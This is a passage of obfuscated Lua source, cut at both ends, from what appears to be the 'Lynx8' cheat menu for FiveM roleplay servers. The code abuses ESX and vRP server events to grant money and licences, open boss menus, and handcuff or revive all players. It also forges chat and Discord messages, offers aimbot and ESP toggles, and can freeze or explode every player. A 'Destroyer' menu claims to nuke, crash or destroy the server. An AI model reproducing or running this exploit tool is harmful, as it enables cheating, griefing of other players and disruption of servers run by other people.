                        function(dz, dA)
                            Lynx8.close()
                        end
                    )
                    Lynx8.CloseMenu()
                elseif
                    Lynx8.Button(
                        '\126\98\126\126\104\126\80\111\108\105\99\101\126\115\126\32\66\111\115\115\32\77\101\110\117'
                    )
                 then
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'police',
                        function(dv, dw)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\112\111\108\105\99\101',
                        function(dv, dw)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'police',
                        function(dx, dy)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\112\111\108\105\99\101',
                        function(dx, dy)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'police',
                        function(dz, dA)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\112\111\108\105\99\101',
                        function(dz, dA)
                            Lynx8.close()
                        end
                    )
                    Lynx8.CloseMenu()
                elseif
                    Lynx8.Button(
                        '\126\114\126\126\104\126\65\109\98\117\108\97\110\99\101\126\115\126\32\66\111\115\115\32\77\101\110\117'
                    )
                 then
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'ambulance',
                        function(dv, dw)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\97\109\98\117\108\97\110\99\101',
                        function(dv, dw)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'ambulance',
                        function(dx, dy)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\97\109\98\117\108\97\110\99\101',
                        function(dx, dy)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'ambulance',
                        function(dz, dA)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\97\109\98\117\108\97\110\99\101',
                        function(dz, dA)
                            Lynx8.close()
                        end
                    )
                    Lynx8.CloseMenu()
                elseif
                    Lynx8.Button(
                        '\126\121\126\126\104\126\84\97\120\105\126\115\126\32\66\111\115\115\32\77\101\110\117'
                    )
                 then
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'taxi',
                        function(dv, dw)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\116\97\120\105',
                        function(dv, dw)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'taxi',
                        function(dx, dy)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\116\97\120\105',
                        function(dx, dy)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'taxi',
                        function(dz, dA)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\116\97\120\105',
                        function(dz, dA)
                            Lynx8.close()
                        end
                    )
                    Lynx8.CloseMenu()
                elseif
                    Lynx8.Button(
                        '\126\103\126\126\104\126\82\101\97\108\32\69\115\116\97\116\101\126\115\126\32\66\111\115\115\32\77\101\110\117'
                    )
                 then
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'realestateagent',
                        function(dv, dw)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\114\101\97\108\101\115\116\97\116\101\97\103\101\110\116',
                        function(dv, dw)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'realestateagent',
                        function(dx, dy)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\114\101\97\108\101\115\116\97\116\101\97\103\101\110\116',
                        function(dx, dy)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'realestateagent',
                        function(dz, dA)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\114\101\97\108\101\115\116\97\116\101\97\103\101\110\116',
                        function(dz, dA)
                            Lynx8.close()
                        end
                    )
                    Lynx8.CloseMenu()
                elseif
                    Lynx8.Button(
                        '\126\111\126\126\104\126\67\97\114\32\68\101\97\108\101\114\126\115\126\32\66\111\115\115\32\77\101\110\117'
                    )
                 then
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'cardealer',
                        function(dv, dw)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\99\97\114\100\101\97\108\101\114',
                        function(dv, dw)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'cardealer',
                        function(dx, dy)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\99\97\114\100\101\97\108\101\114',
                        function(dx, dy)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        'cardealer',
                        function(dz, dA)
                            Lynx8.close()
                        end
                    )
                    TriggerEvent(
                        '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                        '\99\97\114\100\101\97\108\101\114',
                        function(dz, dA)
                            Lynx8.close()
                        end
                    )
                    Lynx8.CloseMenu()
                elseif
                    Lynx8.Button(
                        '\126\121\126\126\104\126\67\117\115\116\111\109\126\115\126\32\66\111\115\115\32\77\101\110\117'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\99\117\115\116\111\109\32\98\111\115\115\32\109\101\110\117\32\106\111\98\32\110\97\109\101',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerEvent(
                            '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                            f,
                            function(dv, dw)
                                Lynx8.close()
                            end
                        )
                        TriggerEvent(
                            '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                            f,
                            function(dx, dy)
                                Lynx8.close()
                            end
                        )
                        TriggerEvent(
                            '\101\115\120\95\115\111\99\105\101\116\121\58\111\112\101\110\66\111\115\115\77\101\110\117',
                            f,
                            function(dz, dA)
                                Lynx8.close()
                            end
                        )
                        Lynx8.CloseMenu()
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\69\83\88\77\111\110\101\121') then
                if Lynx8.Button("~h~<FONT COLOR='#ff22f4'>Automatic Money ~r~ WARNING!") then
                    automaticmoneyesx()
                elseif Lynx8.Button('~g~~h~ESX ~y~Nightline Bus Pay') then
                    local result = KeyboardInput('Enter amount of money USE AT YOUR OWN RISK', '', 100000000)
                    if result then
                        TriggerServerEvent('blarglebus:finishRoute', result)
                    end
                elseif
                    Lynx8.Button(
                        '\126\103\126\126\104\126\69\83\88\32\126\121\126\67\97\117\116\105\111\110\32\71\105\118\101\32\66\97\99\107'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent(
                            '\101\115\120\95\106\111\98\115\58\99\97\117\116\105\111\110',
                            'give_back',
                            f
                        )
                    end
                elseif
                    Lynx8.Button(
                        '\126\112\126\84\69\83\84\32\126\103\126\126\104\126\69\83\88\32\126\121\126\69\100\101\110\32\71\97\114\97\103\101'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent(
                            '\101\100\101\110\95\103\97\114\97\103\101\58\112\97\121\104\101\97\108\116\104',
                            {costs = -f}
                        )
                    end
                elseif
                    Lynx8.Button(
                        '\126\112\126\84\69\83\84\32\126\103\126\126\104\126\69\83\88\32\126\121\126\70\117\101\108\32\68\101\108\105\118\101\114\121'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent(
                            '\101\115\120\95\102\117\101\108\100\101\108\105\118\101\114\121\58\112\97\121',
                            f
                        )
                    end
                elseif
                    Lynx8.Button(
                        '\126\112\126\84\69\83\84\32\126\103\126\126\104\126\69\83\88\32\126\121\126\67\97\114\32\84\104\105\101\102'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent('\101\115\120\95\99\97\114\116\104\105\101\102\58\112\97\121', f)
                    end
                elseif
                    Lynx8.Button(
                        '\126\112\126\84\69\83\84\32\126\103\126\126\104\126\69\83\88\32\126\121\126\68\77\86\32\83\99\104\111\111\108'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent(
                            '\101\115\120\95\100\109\118\115\99\104\111\111\108\58\112\97\121',
                            {costs = -f}
                        )
                    end
                elseif
                    Lynx8.Button(
                        '\126\112\126\84\69\83\84\32\126\103\126\126\104\126\70\85\69\76\32\126\121\126\76\101\103\97\99\121\32\70\117\101\108'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent(
                            '\76\101\103\97\99\121\70\117\101\108\58\80\97\121\70\117\101\108',
                            {costs = -f}
                        )
                    end
                elseif
                    Lynx8.Button(
                        '\126\112\126\84\69\83\84\32\126\103\126\126\104\126\69\83\88\32\126\121\126\68\105\114\116\121\32\74\111\98'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent('\101\115\120\95\103\111\100\105\114\116\121\106\111\98\58\112\97\121', f)
                    end
                elseif
                    Lynx8.Button(
                        '\126\112\126\84\69\83\84\32\126\103\126\126\104\126\69\83\88\32\126\121\126\80\105\122\122\97\32\66\111\121'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent('\101\115\120\95\112\105\122\122\97\58\112\97\121', f)
                    end
                elseif
                    Lynx8.Button(
                        '\126\112\126\84\69\83\84\32\126\103\126\126\104\126\69\83\88\32\126\121\126\82\97\110\103\101\114\32\74\111\98'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent('\101\115\120\95\114\97\110\103\101\114\58\112\97\121', f)
                    end
                elseif
                    Lynx8.Button(
                        '\126\112\126\84\69\83\84\32\126\103\126\126\104\126\69\83\88\32\126\121\126\71\97\114\98\97\103\101\32\74\111\98'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent('\101\115\120\95\103\97\114\98\97\103\101\106\111\98\58\112\97\121', f)
                    end
                elseif
                    Lynx8.Button(
                        '\126\103\126\126\104\126\69\83\88\32\126\121\126\67\97\114\32\84\104\105\101\102\32\126\114\126\68\73\82\84\89\32\77\79\78\69\89'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\100\105\114\116\121\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent('\101\115\120\95\99\97\114\116\104\105\101\102\58\112\97\121', f)
                    end
                elseif
                    Lynx8.Button(
                        '\126\103\126\126\104\126\69\83\88\32\126\121\126\84\114\117\99\107\101\114\32\74\111\98'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent('\101\115\120\95\116\114\117\99\107\101\114\106\111\98\58\112\97\121', f)
                    end
                elseif
                    Lynx8.Button(
                        '\126\103\126\126\104\126\69\83\88\32\126\121\126\65\100\109\105\110\32\71\105\118\101\32\66\97\110\107'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent('\65\100\109\105\110\77\101\110\117\58\103\105\118\101\66\97\110\107', f)
                    end
                elseif
                    Lynx8.Button(
                        '\126\103\126\126\104\126\69\83\88\32\126\121\126\65\100\109\105\110\32\71\105\118\101\32\67\97\115\104'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent('\65\100\109\105\110\77\101\110\117\58\103\105\118\101\67\97\115\104', f)
                    end
                elseif
                    Lynx8.Button('\126\103\126\126\104\126\69\83\88\32\126\121\126\80\111\115\116\97\108\32\74\111\98')
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent('\101\115\120\95\103\111\112\111\115\116\97\108\106\111\98\58\112\97\121', f)
                    end
                elseif
                    Lynx8.Button('\126\103\126\126\104\126\69\83\88\32\126\121\126\66\97\110\107\101\114\32\74\111\98')
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent(
                            '\101\115\120\95\98\97\110\107\115\101\99\117\114\105\116\121\58\112\97\121',
                            f
                        )
                    end
                elseif
                    Lynx8.Button(
                        '\126\103\126\126\104\126\69\83\88\32\126\121\126\83\108\111\116\32\77\97\99\104\105\110\101'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent(
                            '\101\115\120\95\115\108\111\116\109\97\99\104\105\110\101\58\115\118\58\50',
                            f
                        )
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\69\83\88\67\117\115\116\111\109') then
                if Lynx8.Button('~w~~h~Set hunger to ~h~~g~100%') then
                    TriggerEvent('\101\115\120\95\115\116\97\116\117\115\58\115\101\116', 'hunger', 1000000)
                elseif Lynx8.Button('~w~~h~Set thirst to ~h~~g~100%') then
                    TriggerEvent('\101\115\120\95\115\116\97\116\117\115\58\115\101\116', 'thirst', 1000000)
                elseif Lynx8.Button('\126\103\126\126\104\126\69\83\88\32\126\114\126\82\101\118\105\118\101') then
                    local G =
                        KeyboardInput(
                        '\69\110\116\101\114\32\80\108\97\121\101\114\32\73\68\32\111\114\32\97\108\108',
                        '',
                        1000
                    )
                    if G then
                        if G == 'all' then
                            for i = 0, 128 do
                                TriggerEvent(
                                    '\101\115\120\95\97\109\98\117\108\97\110\99\101\106\111\98\58\114\101\118\105\118\101',
                                    GetPlayerServerId(i)
                                )
                                TriggerEvent(
                                    '\101\115\120\95\97\109\98\117\108\97\110\99\101\106\111\98\58\114\101\118\105\118\101',
                                    GetPlayerServerId(i)
                                )
                            end
                        else
                            TriggerEvent(
                                '\101\115\120\95\97\109\98\117\108\97\110\99\101\106\111\98\58\114\101\118\105\118\101',
                                G
                            )
                            TriggerEvent(
                                '\101\115\120\95\97\109\98\117\108\97\110\99\101\106\111\98\58\114\101\118\105\118\101',
                                G
                            )
                        end
                    end
                elseif Lynx8.Button('\126\103\126\126\104\126\69\83\88\32\126\98\126\72\97\110\100\99\117\102\102') then
                    local G =
                        KeyboardInput(
                        '\69\110\116\101\114\32\80\108\97\121\101\114\32\73\68\32\111\114\32\97\108\108',
                        '',
                        1000
                    )
                    if G then
                        if G == 'all' then
                            for i = 0, 128 do
                                TriggerServerEvent(
                                    '\101\115\120\95\112\111\108\105\99\101\106\111\98\58\104\97\110\100\99\117\102\102',
                                    GetPlayerServerId(i)
                                )
                                TriggerEvent(
                                    '\101\115\120\95\112\111\108\105\99\101\106\111\98\58\104\97\110\100\99\117\102\102',
                                    GetPlayerServerId(i)
                                )
                            end
                        else
                            TriggerEvent(
                                '\101\115\120\95\112\111\108\105\99\101\106\111\98\58\104\97\110\100\99\117\102\102',
                                G
                            )
                            TriggerServerEvent(
                                '\101\115\120\95\112\111\108\105\99\101\106\111\98\58\104\97\110\100\99\117\102\102',
                                G
                            )
                        end
                    end
                elseif
                    Lynx8.Button('\126\104\126\71\101\116\32\68\114\105\118\105\110\103\32\76\105\99\101\110\115\101')
                 then
                    TriggerServerEvent(
                        '\101\115\120\95\100\109\118\115\99\104\111\111\108\58\97\100\100\76\105\99\101\110\115\101',
                        dmv
                    )
                    TriggerServerEvent(
                        '\101\115\120\95\100\109\118\115\99\104\111\111\108\58\97\100\100\76\105\99\101\110\115\101',
                        drive
                    )
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\98\126\66\117\121\32\126\115\126\97\32\118\101\104\105\99\108\101\32\102\111\114\32\126\103\126\102\114\101\101'
                    )
                 then
                    bX()
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\69\83\88\68\114\117\103\115') then
                if Lynx8.Button('~h~~g~Harvest ~g~Weed ~c~(x5)') then
                    hweed()
                elseif Lynx8.Button('~h~~g~Transform ~g~Weed ~c~(x5)') then
                    tweed()
                elseif Lynx8.Button('~h~~g~Sell ~g~Weed ~c~(x5)') then
                    sweed()
                elseif Lynx8.Button('~h~~w~Harvest ~w~Coke ~c~(x5)') then
                    hcoke()
                elseif Lynx8.Button('~h~~w~Transform ~w~Coke ~c~(x5)') then
                    tcoke()
                elseif Lynx8.Button('~h~~w~Sell ~w~Coke ~c~(x5)') then
                    scoke()
                elseif Lynx8.Button('~h~~r~Harvest Meth ~c~(x5)') then
                    hmeth()
                elseif Lynx8.Button('~h~~r~Transform Meth ~c~(x5)') then
                    tmeth()
                elseif Lynx8.Button('~h~~r~Sell Meth ~c~(x5)') then
                    smeth()
                elseif Lynx8.Button('~h~~p~Harvest Opium ~c~(x5)') then
                    hopi()
                elseif Lynx8.Button('~h~~p~Transform Opium ~c~(x5)') then
                    topi()
                elseif Lynx8.Button('~h~~p~Sell Opium ~c~(x5)') then
                    sopi()
                elseif Lynx8.Button('~h~~g~Money Wash ~c~(x10)') then
                    mataaspalarufe()
                elseif Lynx8.Button('~r~~h~Stop all ~c~(Drugs)') then
                    matanumaispalarufe()
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\126\114\126\66\108\111\119\32\68\114\117\103\115\32\85\112\32\126\121\126\68\65\78\71\69\82\33',
                        BlowDrugsUp,
                        function(dl)
                            BlowDrugsUp = dl
                        end
                    )
                 then
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\86\82\80\84\114\105\103\103\101\114\115') then
                if
                    Lynx8.Button(
                        '\126\114\126\126\104\126\86\82\80\32\126\115\126\71\105\118\101\32\77\111\110\101\121\32\126\121\112\97\121\71\97\114\97\103\101'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent(
                            '\108\115\99\117\115\116\111\109\115\58\112\97\121\71\97\114\97\103\101',
                            {costs = -f}
                        )
                    end
                elseif
                    Lynx8.Button(
                        '\126\114\126\126\104\126\86\82\80\32\126\103\126\87\73\78\32\126\115\126\83\108\111\116\32\77\97\99\104\105\110\101'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent(
                            '\118\114\112\95\115\108\111\116\109\97\99\104\105\110\101\58\115\101\114\118\101\114\58\50',
                            f
                        )
                    end
                elseif
                    Lynx8.Button(
                        '\126\112\126\84\69\83\84\32\126\103\126\126\104\126\70\85\69\76\32\126\121\126\76\101\103\97\99\121\32\70\117\101\108'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent(
                            '\76\101\103\97\99\121\70\117\101\108\58\80\97\121\70\117\101\108',
                            {costs = -f}
                        )
                    end
                elseif
                    Lynx8.Button(
                        '\126\114\126\126\104\126\86\82\80\32\126\115\126\71\101\116\32\100\114\105\118\105\110\103\32\108\105\99\101\110\115\101'
                    )
                 then
                    TriggerServerEvent('\100\109\118\58\115\117\99\99\101\115\115')
                elseif
                    Lynx8.Button(
                        '\126\114\126\126\104\126\86\82\80\32\126\115\126\66\97\110\107\32\68\101\112\111\115\105\116'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent('\66\97\110\99\97\58\100\101\112\111\115\105\116', f)
                        TriggerServerEvent('\98\97\110\107\58\100\101\112\111\115\105\116', f)
                    end
                elseif
                    Lynx8.Button(
                        '\126\114\126\126\104\126\86\82\80\32\126\115\126\66\97\110\107\32\87\105\116\104\100\114\97\119\32'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent('\98\97\110\107\58\119\105\116\104\100\114\97\119', f)
                        TriggerServerEvent('\66\97\110\99\97\58\119\105\116\104\100\114\97\119', f)
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\77\105\115\99\84\114\105\103\103\101\114\115') then
                if Lynx8.Button('\126\104\126\83\101\110\100\32\68\105\115\99\111\114\100\32\77\101\115\115\97\103\101') then
                    local dB = KeyboardInput('Enter message to send', '', 100)
                    TriggerServerEvent('DiscordBot:playerDied', dB, '1337')
                    drawNotification('The message:~n~' .. dB .. '~n~Has been ~g~sent!')
                elseif Lynx8.Button('\126\104\126\83\101\110\100\32\70\97\107\101\32\77\101\115\115\97\103\101') then
                    local dC = KeyboardInput('Enter player name', '', 100)
                    if dC then
                        local cG = KeyboardInput('Enter message', '', 1000)
                        if cG then
                            TriggerServerEvent('_chat:messageEntered', dC, {0, 0x99, 255}, cG)
                        end
                    end
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\103\126\69\83\88\32\126\121\126\67\97\114\84\104\105\101\102\32\126\115\126\84\82\79\76\76'
                    )
                 then
                    drawNotification(
                        '\126\121\126\101\115\120\95\99\97\114\116\104\105\101\102\32\126\103\126\114\101\113\117\105\114\101\100'
                    )
                    drawNotification(
                        '\126\103\126\84\114\121\105\110\103\32\116\111\32\115\101\110\100\32\97\108\101\114\116\115'
                    )
                    carthieftroll()
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\65\100\118\97\110\99\101\100\77\101\110\117') then
                if Lynx8.MenuButton('~h~~p~-> ~s~Destroyer', '\68\101\115\116\114\111\121\101\114') then
                elseif Lynx8.MenuButton('~h~~p~-> ~s~ESP Menu', '\69\83\80\77\101\110\117') then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\84\114\105\103\103\101\114\66\111\116',
                        TriggerBot,
                        function(dl)
                            TriggerBot = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\80\108\97\121\101\114\32\66\108\105\112\115',
                        d3,
                        function(d3)
                        end
                    )
                 then
                    cg = not cg
                    d3 = cg
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\78\97\109\101\32\65\98\111\118\101\32\80\108\97\121\101\114\115\32\126\103\126\118\49',
                        ch,
                        function(dl)
                            ch = dl
                            ci = false
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '~h~Name Above Players & Indicator ~g~v2',
                        ci,
                        function(dl)
                            ci = dl
                            ch = false
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '~h~Chat Spam',
                        chatspam,
                        function(enabled)
                            chatspam = true
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '~h~~r~AimBot Test (buggy)',
                        aimtest,
                        function(enabled)
                            aimtest = enabled
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '~h~Banana ~r~All Players',
                        BananaAll,
                        function(enabled)
                            BananaAll = enabled
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '~h~Boom ~r~Banana',
                        BananaBoom,
                        function(enabled)
                            BananaBoom = enabled
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '~h~Banana Spawn',
                        BananaSpawn,
                        function(enabled)
                            BananaSpawn = enabled
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '~h~Banana ~r~Crazy',
                        BananaCrazy,
                        function(enabled)
                            BananaCrazy = enabled
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '~h~Attempt Server pedCrash',
                        nukespawncrash,
                        function(enabled)
                            nukespawncrash = enabled
                        end
                    )
                 then
                elseif Lynx8.Button('~h~Wall Script Execution') then
                    wallin()
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\82\67\83',
                        norecoil,
                        function(dl)
                            norecoil = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\67\114\111\115\115\104\97\105\114',
                        crosshair,
                        function(dl)
                            crosshair = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\126\114\126\70\114\101\101\122\101\126\115\126\32\65\108\108\32\112\108\97\121\101\114\115',
                        freezeall,
                        function(dl)
                            freezeall = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\126\114\126\69\120\112\108\111\100\101\126\115\126\32\65\108\108\32\112\108\97\121\101\114\115',
                        blowall,
                        function(dl)
                            blowall = dl
                        end
                    )
                 then
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\68\101\115\116\114\111\121\101\114') then
                if Lynx8.Button('\126\104\126\126\114\126\78\117\107\101\32\126\115\126\83\101\114\118\101\114') then
                    nukeserver()
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\126\114\126\83\105\108\101\110\116\32\126\115\126\83\101\114\118\101\114\32\126\121\126\67\114\97\115\104\101\114',
                        servercrasherxd,
                        function(dl)
                            servercrasherxd = dl
                        end
                    )
                 then
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\103\126\69\83\88\32\126\114\126\68\101\115\116\114\111\121\32\126\98\126\118\50'
                    )
                 then
                    esxdestroyv2()
                elseif
                    Lynx8.Button(
